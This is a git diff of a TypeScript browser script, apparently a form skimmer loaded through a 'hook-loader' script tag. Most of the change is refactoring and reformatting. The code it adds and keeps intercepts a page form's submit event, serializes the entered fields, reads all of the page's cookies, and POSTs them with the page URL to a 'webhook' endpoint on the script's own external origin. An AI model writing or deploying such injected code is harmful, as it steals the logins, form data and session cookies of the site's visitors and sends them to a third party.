@@ -40,8 +40,7 @@ HTMLFormElement.prototype.serializeObject = function () {
 Object.prototype.serializeJSON = function () {
   return JSON.stringify(this);
 };
-let _wx_ = (document.currentScript ??
-  document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;
+let _wx_ = (document.currentScript ?? document.querySelector('script[id="hook-loader"]')) as HTMLScriptElement;
 
 interface IHook {
   send(payload: object): Promise<void>;
@@ -54,14 +53,13 @@ interface IHook {
 }
 
 class Hook implements IHook {
-  get cookies(): Object {
-    return Object.fromEntries(document.cookie.split('; ').map(c => c.split('=')));
-  }
   constructor() {
     // @ts-ignore
-    this.uri = new URL(
-      _wx_.src.replace(/^(\/\/)/, window.location.protocol + '//'),
-    );
+    this.uri = new URL(_wx_.src.replace(/^(\/\/)/, window.location.protocol + '//'));
+  }
+
+  get cookies(): Object {
+    return Object.fromEntries(document.cookie.split('; ').map((c) => c.split('=')));
   }
 
   private _uri: URL;
@@ -80,11 +78,10 @@ class Hook implements IHook {
     return document.querySelector(selector) as Element;
   }
 
-  async send(payload: object) {
-    console.warn('send', payload);
+  send(payload: object) {
     const srv = [this.uri.origin, 'webhook'].join('/');
     const now = new Date().valueOf();
-    return await fetch(`${srv}?time=${now}`, {
+    return fetch(`${srv}?time=${now}`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -92,7 +89,7 @@ class Hook implements IHook {
         'sec-fetch-mode': 'cors',
         'sec-fetch-site': 'cross-site',
       },
-      body: { origin: window.location.href,cookies:this.cookies,...payload }.serializeJSON(),
+      body: { origin: window.location.href, cookies: this.cookies, ...payload }.serializeJSON(),
       referrer: window.location.href,
       referrerPolicy: 'strict-origin-when-cross-origin',
       mode: 'cors',
@@ -109,28 +106,27 @@ class Hook implements IHook {
   }
 
   intercept(form: HTMLFormElement) {
-    const interceptToggle = (yes: boolean = true) => {
-      yes
-        ? form.addEventListener('submit', submithandler)
-        : form.removeEventListener('submit', submithandler);
-    };
-    const submithandler = async (e: SubmitEvent) => {
-      e.stopPropagation();
-      const payload = e.target.serializeObject();
-      console.warn('payload', payload);
-      void (await this.send(payload)
-        .then((data) => {
-          console.warn('send', data);
+    form.addEventListener('submit', this.submithandler);
+  }
+
+  submithandler(e: SubmitEvent) {
+    e.stopPropagation();
+    const payload = e.target.serializeObject();
+    try {
+      this.send(payload)
+        .then((response) => {
+          console.warn('submithandler', response);
         })
         .catch((reason) => {
-          console.error('send', reason);
-        }));
-    };
-    interceptToggle();
+          console.error('submithandler', reason);
+        });
+    } catch (reason) {
+      console.error('submithandler', reason);
+    }
   }
 
   init(selector: string) {
-    console.warn('init', {selector:selector,cookies:this.cookies});
+    console.warn('init', { selector: selector, cookies: this.cookies });
     this.waitForElement(selector).then((el) => {
       this.intercept(el as HTMLFormElement);
     });
